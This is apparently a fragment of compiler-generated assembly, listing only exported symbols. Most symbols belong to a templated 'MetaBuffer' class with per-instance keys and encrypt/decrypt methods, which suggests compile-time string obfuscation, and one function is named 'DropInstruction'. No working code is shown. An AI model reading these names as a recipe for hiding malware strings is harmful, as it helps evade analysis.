PUBLIC	?encrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0EN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,77,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
PUBLIC	?isDecrypted@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; DropInstruction
PUBLIC	??0?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEBA_NXZ ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt
PUBLIC	??0?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$0FE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<89,84,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$0EB@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,65,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
PUBLIC	??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z ; std::_Pocca<std::allocator<wchar_t> >
PUBLIC	??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
PUBLIC	??$_Convert_size@_K_K@std@@YA_K_K@Z		; std::_Convert_size<unsigned __int64,unsigned __int64>
PUBLIC	??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
PUBLIC	??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
PUBLIC	??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
PUBLIC	??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
PUBLIC	??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
PUBLIC	??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z ; std::_Construct_in_place<wchar_t *,wchar_t * &>
PUBLIC	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z		; std::_Unfancy<wchar_t>
PUBLIC	??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z	; std::_Destroy_in_place<wchar_t *>
PUBLIC	??$max@_K@std@@YAAEB_KAEB_K0@Z			; std::max<unsigned __int64>
PUBLIC	??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z	; std::_Deallocate<16,0>
PUBLIC	??$min@_K@std@@YAAEB_KAEB_K0@Z			; std::min<unsigned __int64>
PUBLIC	??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
PUBLIC	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
PUBLIC	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z	; std::addressof<wchar_t *>
PUBLIC	??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
PUBLIC	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>
PUBLIC	??$_Get_size_of_n@$01@std@@YA_K_K@Z		; std::_Get_size_of_n<2>
PUBLIC	??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z ; std::_Allocate_manually_vector_aligned<std::_Default_allocate_traits>
PUBLIC	__JustMyCode_Default
PUBLIC	??_7exception@std@@6B@				; std::exception::`vftable'
PUBLIC	??_C@_0BC@EOODALEL@Unknown?5exception@		; `string'
PUBLIC	??_7bad_alloc@std@@6B@				; std::bad_alloc::`vftable'
PUBLIC	??_7bad_array_new_length@std@@6B@		; std::bad_array_new_length::`vftable'
PUBLIC	??_C@_0BF@KINCDENJ@bad?5array?5new?5length@	; `string'
PUBLIC	??_R0?AVexception@std@@@8			; std::exception `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
PUBLIC	_TI3?AVbad_array_new_length@std@@
PUBLIC	_CTA3?AVbad_array_new_length@std@@
PUBLIC	??_R0?AVbad_array_new_length@std@@@8		; std::bad_array_new_length `RTTI Type Descriptor'
PUBLIC	_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
PUBLIC	??_R0?AVbad_alloc@std@@@8			; std::bad_alloc `RTTI Type Descriptor'
